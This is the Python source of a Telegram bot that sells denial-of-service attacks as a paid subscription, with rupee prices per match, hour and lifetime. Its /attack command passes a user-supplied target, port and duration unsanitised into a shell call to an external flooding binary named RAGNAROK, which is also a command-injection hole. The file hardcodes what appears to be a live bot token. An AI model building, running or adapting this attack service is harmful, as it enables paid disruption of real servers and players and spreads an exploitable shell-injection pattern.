import telebot
import subprocess
import datetime

# Replace with your bot's token
bot = telebot.TeleBot("7600239180:AAH2gAmpfqc66Q2Ffwuj7BwC2KbSQZqA1II")

# Admin user IDs
ADMIN_IDS = ["5900643820"]

# Channel ID for storing data (replace with your channel's ID, e.g., -1002399193984)
CHANNEL_ID = -1002399193984

# Function to log commands to the channel
def log_command(user_id, command, target=None, port=None, time=None):
    log_entry = f"📝 **Log Entry:**\n\n📅 **Time:** {datetime.datetime.now()}\n👤 **UserID:** {user_id}\n⚙️ **Command:** {command}"
    if target:
        log_entry += f"\n🎯 **Target:** {target}"
    if port:
        log_entry += f"\n🔢 **Port:** {port}"
    if time:
        log_entry += f"\n⏳ **Time:** {time} seconds"
    bot.send_message(CHANNEL_ID, log_entry, parse_mode="Markdown")

# Function to retrieve allowed user IDs from the channel
def get_allowed_users():
    # Simulating fetching user list from the channel (replace with your implementation if necessary)
    return ["5900643820"]  # Example: Pre-approved user IDs

# Command: /start
@bot.message_handler(commands=["start"])
def welcome_start(message):
    user_name = message.from_user.first_name
    response = f"👋 Welcome, {user_name}!\n\nUse /help to see the list of available commands.\n\n💡 Tip: Follow the rules to avoid being restricted."
    bot.reply_to(message, response)

# Command: /help
@bot.message_handler(commands=["help"])
def show_help(message):
    help_text = """📚 Available Commands:

🔹 /attack <target> <port> <time> - Start an attack.
🔹 /mylogs - View your attack logs.
🔹 /rules - View usage rules.
🔹 /plan - View subscription plans.
🔹 /getcanary - Get the Canary app link.

⚙️ Admin-only Commands:
🔸 /add <userId> - Add a user.
🔸 /remove <userId> - Remove a user."""
    bot.reply_to(message, help_text)

# Command: /rules
@bot.message_handler(commands=["rules"])
def welcome_rules(message):
    response = """📜 **Rules for Usage:**

1. 🚫 Do not run multiple attacks simultaneously.
2. ⚠️ Misuse may result in a permanent ban.
3. 📌 Respect the time limits and cooldown periods.

🛠 Follow these rules to enjoy uninterrupted services."""
    bot.reply_to(message, response, parse_mode="Markdown")

# Command: /plan
@bot.message_handler(commands=["plan"])
def view_plan(message):
    response = """💼 **Subscription Plans:**

**VIP Plan:**
- Attack time: 200 seconds
- Cooldown: 2 minutes
- Concurrent attacks: 300

**Prices:**
- Per match: ₹30
- Per hour: ₹50
- Per day: ₹250
- Per week: ₹900
- Per month: ₹1600
- Lifetime: ₹2000

💳 Contact admin for subscriptions!"""
    bot.reply_to(message, response, parse_mode="Markdown")

# Command: /attack
@bot.message_handler(commands=["attack"])
def attack(message):
    user_id = str(message.chat.id)
    allowed_user_ids = get_allowed_users()
    if user_id in allowed_user_ids or user_id in ADMIN_IDS:
        parts = message.text.split()
        if len(parts) != 4:
            bot.reply_to(message, "❌ **Usage:** /attack `<target>` `<port>` `<time>`", parse_mode="Markdown")
            return

        target, port, time = parts[1], parts[2], parts[3]
        try:
            port = int(port)
            time = int(time)
        except ValueError:
            bot.reply_to(message, "❌ Port and time must be integers.", parse_mode="Markdown")
            return

        if time > 300:
            bot.reply_to(message, "⚠️ Time interval must be ≤ 300 seconds.", parse_mode="Markdown")
            return

        log_command(user_id, "/attack", target, port, time)
        response = f"🚀 **Attack Initiated**\n\n📌 **Target:** {target}\n🔢 **Port:** {port}\n⏳ **Time:** {time} seconds\n\n💥 **Status:** In progress..."
        bot.reply_to(message, response, parse_mode="Markdown")

        # Simulate attack execution
        subprocess.run(f"./RAGNAROK {target} {port} {time}", shell=True)

        bot.reply_to(message, f"✅ **Attack Completed**\n\n📌 **Target:** {target}\n🔢 **Port:** {port}", parse_mode="Markdown")
    else:
        bot.reply_to(message, "❌ You are not authorized to use this command.", parse_mode="Markdown")

# Command: /mylogs
@bot.message_handler(commands=["mylogs"])
def show_logs(message):
    user_id = str(message.chat.id)
    # Logs are stored in the channel; users cannot directly access them here.
    bot.reply_to(message, "🗂 Your logs are stored securely. Contact the admin for access.", parse_mode="Markdown")

# Command: /getcanary
@bot.message_handler(commands=["getcanary"])
def get_canary_app(message):
    user_id = str(message.chat.id)
    allowed_user_ids = get_allowed_users()
    if user_id in allowed_user_ids or user_id in ADMIN_IDS:
        response = "📲 **Here is your app:** [Canary App](https://t.me/POVER_FULL_MODS77/909)\n\nEnjoy!"
        bot.reply_to(message, response, parse_mode="Markdown")
    else:
        bot.reply_to(message, "❌ You are not authorized to use this command.", parse_mode="Markdown")

# Admin Command: /add
@bot.message_handler(commands=["add"])
def add_user(message):
    user_id = str(message.chat.id)
    if user_id in ADMIN_IDS:
        parts = message.text.split()
        if len(parts) == 2:
            new_user = parts[1]
            bot.send_message(CHANNEL_ID, f"👤 **New User Added:** {new_user}", parse_mode="Markdown")
            bot.reply_to(message, f"✅ User {new_user} added successfully.", parse_mode="Markdown")
        else:
            bot.reply_to(message, "❌ **Usage:** /add `<userId>`", parse_mode="Markdown")
    else:
        bot.reply_to(message, "❌ You are not authorized to use this command.", parse_mode="Markdown")

# Command: /remove
@bot.message_handler(commands=["remove"])
def remove_user(message):
    user_id = str(message.chat.id)
    if user_id in ADMIN_IDS:
        parts = message.text.split()
        if len(parts) == 2:
            remove_user = parts[1]
            bot.send_message(CHANNEL_ID, f"🗑️ **User Removed:** {remove_user}", parse_mode="Markdown")
            bot.reply_to(message, f"✅ User {remove_user} removed successfully.", parse_mode="Markdown")
        else:
            bot.reply_to(message, "❌ **Usage:** /remove `<userId>`", parse_mode="Markdown")
    else:
        bot.reply_to(message, "❌ You are not authorized to use this command.", parse_mode="Markdown")

# Start the bot
bot.polling(none_stop=True)